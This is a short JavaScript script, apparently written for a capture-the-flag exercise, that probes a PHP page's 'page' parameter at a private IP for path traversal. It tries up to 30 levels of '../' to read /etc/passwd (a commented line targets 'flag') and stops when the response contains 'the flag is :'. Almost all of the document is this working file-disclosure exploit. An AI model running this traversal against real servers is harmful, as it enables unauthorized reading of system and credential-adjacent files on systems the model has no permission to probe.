async function testTraversal(baseUrl) {
  const maxDepth = 30;

  for (let depth = 1; depth <= maxDepth; depth++) {
    const traversal = "../".repeat(depth);
    const payload = `${traversal}etc/passwd`;
    // const payload = `${traversal}flag`;
    const url = `${baseUrl}?page=${payload}`;

    console.log(`Testing depth ${depth}: ${url}`);

    try {
      const response = await fetch(url);

      if (response.ok) {
        const text = await response.text();

        if (text.toLowerCase().includes('the flag is :')) {
            console.log(`Found flag at depth ${depth}: ${text.substring(0, 150)}`);
            break;
        }else {
          console.log(`No flag found at depth ${depth}`);
        }
      }
    } catch (error) {
      console.error(`Error at depth ${depth}: ${error.message}`);
    }
  }
}

const baseUrl = "http://10.12.100.119/index.php";
testTraversal(baseUrl);
